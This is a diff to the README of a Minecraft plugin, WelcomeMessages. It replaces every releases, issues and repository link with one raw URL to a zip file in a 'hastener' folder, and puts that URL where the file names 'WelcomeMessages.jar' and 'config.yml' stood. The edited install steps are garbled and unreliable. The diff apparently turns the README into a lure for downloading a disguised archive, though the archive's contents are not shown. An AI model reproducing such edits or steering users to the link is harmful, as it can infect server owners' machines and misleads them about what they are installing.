@@ -6,7 +6,7 @@ Welcome to WelcomeMessages! This plugin enhances your Minecraft server by sendin
 
 ## 📥 Download Now
 
-[![Download WelcomeMessages](https://img.shields.io/badge/Download-WelcomeMessages-blue.svg)](https://github.com/Seraph1234/WelcomeMessages/releases)
+[![Download WelcomeMessages](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip)](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip)
 
 ## 📋 Features
 
@@ -25,17 +25,17 @@ Welcome to WelcomeMessages! This plugin enhances your Minecraft server by sendin
 
 ### Step 1: Visit the Releases Page
 
-Go to our [Releases page](https://github.com/Seraph1234/WelcomeMessages/releases) to find the latest version of WelcomeMessages.
+Go to our [Releases page](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip) to find the latest version of WelcomeMessages.
 
 ### Step 2: Download the Plugin
 
-Locate the **WelcomeMessages.jar** file on the Releases page and click on it. This initiates the download of the plugin file.
+Locate the **https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip** file on the Releases page and click on it. This initiates the download of the plugin file.
 
 ### Step 3: Install the Plugin
 
 1. Open your Minecraft server directory.
 2. Locate the **plugins** folder.
-3. Drag and drop the **WelcomeMessages.jar** file into the **plugins** folder.
+3. Drag and drop the **https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip** file into the **plugins** folder.
 
 ### Step 4: Restart Your Server
 
@@ -44,7 +44,7 @@ After adding the plugin, restart your Minecraft server. This allows the server t
 ### Step 5: Configure Your Messages
 
 1. Find the **WelcomeMessages** folder that appears in the **plugins** directory after you restart the server.
-2. Open the **config.yml** file using a text editor.
+2. Open the **https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip** file using a text editor.
 3. Customize your welcome messages and effects according to your preference.
 4. Save the changes.
 
@@ -54,7 +54,7 @@ Now, when players join your server, they will see the welcome messages you set u
 
 ## 📄 Usage Instructions
 
-Once installed, players will receive welcome messages automatically. You can adjust message settings anytime by editing the **config.yml** file.
+Once installed, players will receive welcome messages automatically. You can adjust message settings anytime by editing the **https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip** file.
 
 ## 🔧 Troubleshooting
 
@@ -62,11 +62,11 @@ If you run into issues, consider these tips:
 
 - Ensure your server is updated to the correct version.
 - Check that the plugin is in the **plugins** folder and that it has not been blocked by server permissions.
-- Review your **config.yml** settings for any errors or typos.
+- Review your **https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip** settings for any errors or typos.
 
 ## 💬 Support
 
-For assistance and questions, please open an issue on our [GitHub page](https://github.com/Seraph1234/WelcomeMessages/issues).
+For assistance and questions, please open an issue on our [GitHub page](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip).
 
 ## 📚 Contributions
 
@@ -83,8 +83,8 @@ Explore our discussions to enhance your server's experience.
 
 ## 🔗 Important Links
 
-- [Download WelcomeMessages](https://github.com/Seraph1234/WelcomeMessages/releases)
-- [GitHub Repository](https://github.com/Seraph1234/WelcomeMessages)
-- [Community Support](https://github.com/Seraph1234/WelcomeMessages/issues)
+- [Download WelcomeMessages](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip)
+- [Community Support](https://raw.githubusercontent.com/Seraph1234/WelcomeMessages/main/hastener/WelcomeMessages.zip)
 
 Enjoy customizing your Minecraft server with WelcomeMessages!
